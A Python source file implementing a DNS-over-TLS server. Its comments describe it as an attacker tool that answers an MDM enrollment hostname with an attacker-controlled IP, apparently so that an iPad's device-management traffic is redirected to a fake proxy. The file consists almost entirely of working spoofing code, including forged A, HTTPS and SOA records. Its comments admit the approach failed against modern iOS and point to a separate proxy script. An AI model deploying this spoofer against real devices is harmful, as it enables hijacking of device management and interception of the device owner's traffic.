#!/usr/bin/env python3
# minimal DoT server. for the MDM hostname answers A=<attacker ip>.
# everything else NXDOMAIN.
#
# NOTE: this approach did NOT work end-to-end against modern iOS.
# the device would open DoT, ask for type=65 (HTTPS RR), and either never
# fall back to A or refuse to connect to a public hostname that resolved
# to RFC1918 space. kept here for anyone who wants to pick up where it died.
# the proxy approach in fake_proxy.py is what actually worked.

import ssl, socket, struct, threading

TARGET = "mdm.example.org"
ANSWER = "192.0.2.10"           # your host, same subnet as the ipad
CERT = "./certs/dot.crt"        # cert matching the SNI you configure on the device
KEY = "./certs/dot.key"


def dns_labels(buf, off):
    parts, jumped, max_jumps = [], False, 0
    while True:
        l = buf[off]
        if l & 0xC0 == 0xC0:
            if not jumped:
                ret_off = off + 2
            off = ((l & 0x3F) << 8) | buf[off + 1]
            jumped = True
            max_jumps += 1
            if max_jumps > 10:
                break
            continue
        off += 1
        if l == 0:
            break
        parts.append(buf[off:off + l].decode("ascii", "replace"))
        off += l
    name = ".".join(parts).lower()
    return name, (ret_off if jumped else off)


def build_resp(q, name, qtype, matched):
    # on match: A(1) returns the attacker ip; AAAA(28)/HTTPS(65)/other
    # returns proper NODATA (NOERROR + SOA in authority) so the device falls
    # back to A. no match: NXDOMAIN.
    tid = q[:2]
    give_a = matched and qtype == 1
    give_https = matched and qtype == 65
    rcode = 0 if matched else 3
    give_soa = matched and not (give_a or give_https)
    flags = 0x8580 | rcode
    ancount = 1 if (give_a or give_https) else 0
    nscount = 1 if give_soa else 0
    hdr = tid + struct.pack(">HHHHH", flags, 1, ancount, nscount, 0)
    qstart = 12
    off = qstart
    while q[off] != 0:
        off += 1 + q[off]
    off += 1 + 4
    question = q[qstart:off]
    body = hdr + question
    if give_a:
        rr = struct.pack(">HHHIH", 0xC00C, 1, 1, 60, 4) + socket.inet_aton(ANSWER)
        body += rr
    if give_https:
        # HTTPS RR: priority=1, target=".", svcparams: alpn=h2,http/1.1 + ipv4hint
        alpn = b"\x02h2\x08http/1.1"
        svcparams = struct.pack(">HH", 1, len(alpn)) + alpn
        svcparams += struct.pack(">HH", 4, 4) + socket.inet_aton(ANSWER)
        rdata = struct.pack(">H", 1) + b"\x00" + svcparams
        rr = struct.pack(">HHHIH", 0xC00C, 65, 1, 60, len(rdata)) + rdata
        body += rr
    if give_soa:
        def enc(n):
            out = b""
            for l in n.split("."):
                out += bytes([len(l)]) + l.encode()
            return out + b"\x00"
        mname = enc("ns.local")
        rname = enc("hostmaster.local")
        soa_data = mname + rname + struct.pack(">IIIII", 1, 60, 60, 3600, 60)
        rr = struct.pack(">HHHIH", 0xC00C, 6, 1, 60, len(soa_data)) + soa_data
        body += rr
    return body


def handle(conn, peer):
    try:
        data = b""
        while len(data) < 2:
            c = conn.recv(2 - len(data))
            if not c:
                return
            data += c
        n = struct.unpack(">H", data)[0]
        q = b""
        while len(q) < n:
            c = conn.recv(n - len(q))
            if not c:
                return
            q += c
        name, off = dns_labels(q, 12)
        qtype = struct.unpack(">H", q[off:off + 2])[0]
        matched = (name == TARGET)
        verdict = ("A " + ANSWER if matched and qtype == 1
                   else ("NODATA" if matched else "NXDOMAIN"))
        print(f"  [{peer[0]}] DNS: {name} type={qtype} -> {verdict}", flush=True)
        resp = build_resp(q, name, qtype, matched)
        conn.sendall(struct.pack(">H", len(resp)) + resp)
    except Exception as e:
        print(f"  dns err: {e}", flush=True)
    finally:
        try:
            conn.close()
        except Exception:
            pass


def main():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 853))
    s.listen(16)
    print("DoT listening 0.0.0.0:853", flush=True)
    while True:
        c, a = s.accept()
        try:
            tls = ctx.wrap_socket(c, server_side=True)
        except Exception as e:
            print(f"  tls handshake fail from {a}: {e}", flush=True)
            continue
        threading.Thread(target=handle, args=(tls, a), daemon=True).start()


if __name__ == "__main__":
    main()
